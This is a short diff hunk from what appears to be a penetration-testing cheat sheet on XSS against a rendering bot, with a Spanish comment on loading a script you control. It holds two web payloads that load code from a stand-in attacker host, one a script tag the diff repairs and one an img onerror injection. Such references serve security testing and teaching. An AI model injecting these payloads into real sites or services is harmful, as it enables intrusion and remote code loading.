@@ -20,7 +20,7 @@ Path disclosure:
 
 Load an external script:
    <!-- La mejor forma conforme para aprovechar esta vulnerabilidad es abusar de la vulnerabilidad para hacer que el bot cargue un script que controlas localmente. Luego, podrá cambiar la carga útil localmente y hacer que el bot lo cargue con el mismo código cada vez -->
-   1- script src="http://attacker.com/myscripts.js"></script>
+   1- <script src="http://attacker.com/myscripts.js"></script>
    2- <img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
 
 Read local file:
